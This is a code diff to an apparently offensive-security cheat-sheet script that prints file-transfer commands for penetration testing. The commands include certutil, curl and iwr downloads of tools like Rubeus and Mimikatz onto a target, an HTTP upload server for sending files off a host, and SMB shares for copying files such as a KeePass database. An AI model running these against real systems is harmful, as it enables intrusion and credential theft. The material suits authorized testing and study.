@@ -310,11 +310,11 @@ def print_trans(ip, port, protocol, file):
     def scp(ip, file, port):
 
         print(f"To copy a file over from local host to a remote host")
-        print(f"scp ./{file} username@{ip}:/tmp/{file} -p {port}")
+        print(f"scp ./{file} user@{ip}:/tmp/{file} -p {port}")
         print(f"To copy a file from a remote host to your local host")
-        print(f"scp username@{ip}:/tmp/{file} ./{file}")
+        print(f"scp user@{ip}:/tmp/{file} ./{file}")
         print(f"To copy over a directory from your local host to a remote host")
-        print(f"scp -r directory username@{ip}:/tmp/{file}")
+        print(f"scp -r directory user@{ip}:./{file}")
 
     def socat(ip, port, file):
         print(f"socat -u FILE:'{file}' TCP-LISTEN:{port},reuseaddr")
@@ -332,49 +332,58 @@ def print_trans(ip, port, protocol, file):
 
 
     def http(ip, port, file):
-        print("\n********** HTTP **********\n\n")
 
-        print("\n********** Listener **********\n")
+        port_f = f":{port}"
+        print("\n********** HTTP **********\n")
 
-        print(f"php -S 0.0.0.0{port}")
-        print("ruby -run -e httpd . -p 8000")
+        print("\n********** Listeners **********\n")
 
-        print(f"python -m SimpleHTTPServer 8080")
-        print(f"python2 -m SimpleHTTPServer 8080")
+        print(f"php -S 0.0.0.0{port_f}")
+        print("ruby -run -e httpd . -p {port}")
+
+        print(f"python -m SimpleHTTPServer {port}")
+        print(f"python2 -m SimpleHTTPServer {port}")
         print(f"python3 -m http.server {port}")
 
-        print("\n********** Upload Server **********\n")
-        print(f"python3 -m uploadserver --basic-auth hello:world")
-        print(f"curl -X POST http://HOST/upload -H -F 'files=@file.txt'")
+        print(f"python3 -m uploadserver {port}")
+        print(f"python3 -m uploadserver --basic-auth $SUDO_USER:Password123")
+        
+        print("\n********** Upload **********\n")
+        print(f"curl -X POST http://{ip}{port_f}/upload -F 'files=@{file}'")
 
-        print("\n********** Windows **********\n")
+
+        print("\n********** Windows Download **********\n")
         print(f"certutil.exe -f -urlcache -split http://{ip}{port}/{file}")
         print(f"certutil -decode payload.b64 payload.dll")
         print(f"certutil -encode payload.dll payload.b64")
-        print(f"curl 10.10.14.29/Rubeus.exe -o Rubeus.exe")
-        print(f"wget http://192.168.1.2/putty.exe -OutFile putty.exe")
-        print(f"iwr -uri http://10.10.14.29/PS.exe -OutFile PsBypassCLM.exe")
-        print(f"iwr por TLS:")
+        print(f"curl http://{ip}{port_f}/{file} -o {file}")
+        print(f"wget http://{ip}{port_f}/{file} -OutFile {file}")
+        print(f"iwr -uri http://{ip}{port_f}/{file} -OutFile {file}")
+        print(f"enable TLS:")
         print(f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12")
 
-        print("\n********** Linux **********\n")
+        print("\n********** Linux Download **********\n")
         print(f"wget {ip}:{port} {file}")
         print(f"curl http://{ip}:{port}/{file} --output {file}")
 
-    def smb(ip, file):
+    def smb(ip, file, port):
 
-        print("\n********** SMB **********\n\n")
-        print("\n********** Listener **********\n")
-        print(f"wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/")
+        print("\n********** SMB share **********\n\n")
+        print(f"wsgidav --host=0.0.0.0 --port={port} --auth=anonymous --root /home/$SUDO_USER/webdav")
         print(f"impacket-smbserver share $(pwd) -smb2support")
         print(f"smbserver.py -smb2support share .")
 
-        print(f"copy CEH.kdbx \\10.10.14.3\smbFolder\CEH.kdbx De Win a nuestro parrot")
-        print(f"copy \\10.10.14.3\smbFolder\CEH.kdbx CEH.kdbx De parrot a Win")
-        print(f"net use x: \\10.185.10.34\smbFolder /user:share_admin Wind0wz87!kj")
-        print(f"X: para usar esta unidad compartida") 
-        print(f"net view \\10.10.14.3\smbFolder")
-
+        print("Bring from the remote host to our machine")
+        print(f"copy .\{file} \\{ip}\share\{file}")
+        print(f"Upload to remote host")
+        print(f"copy \\{ip}\share\{file} .\{file}")
+       
+        print("\nCreate a logical unit")
+        print(f"net use x: \\{ip}\share /user:$SUDO_USER Password123")
+        print("Bring from the remote host to our machine")
+        print(f"copy .\{file} x:\{file}")
+        print(f"Upload to remote host")
+        print(f"copy x:\{file} .\{file}")
 
     if protocol == "-paths":
         paths()
@@ -391,7 +400,7 @@ def print_trans(ip, port, protocol, file):
     elif protocol == "-http":
         http(ip, port, file)
     elif protocol == "-smb":
-        smb(ip, file)
+        smb(ip, file, port)
     else:
         print(f"Protocol '{protocol}' not recognized.")
 
@@ -412,13 +421,17 @@ def main(use_macro):
         print("\n\tUsage: shell <IP> <PORT> -trans <PROTOCOL> <FILE>")
         print("\n\tThe file transfer functions require installing the following libraries:")
         print("\n\t\tpip3 install wsgidav")
-        print("\n\t\tpip install pyftpdlib")
-        print("\n\t\tpip install updog")
-        print("\n\t\tpython3 -m pip install --user uploadserver")
+        print("\t\tpip install pyftpdlib")
+        print("\t\tpip install updog")
+        print("\t\tpython3 -m pip install --user uploadserver")
 
         print("Transfers: \n\t-paths \n\t-installs \n\t-ftp \n\t-scp \n\t-socat \n\t-nc \n\t-http \n\t-smb ")
         print("\nExamples:\n")
         print(f"\tshell 192.168.1.72 4444 -paths")
+        print(f"\tshell 192.168.45.170 4444 -trans -smb rubeus.exe")
+        print(f"\tshell 192.168.45.170 4444 -trans -http mimikatz.exe")
+
+        
 
 
         sys.exit(1)
@@ -485,6 +498,8 @@ def main(use_macro):
         print_trans(ip, port, protocol, file)
     else:
         print(f"Shell type '{shell_type}' not recognized.")
+
+
 
 if __name__ == "__main__":
     
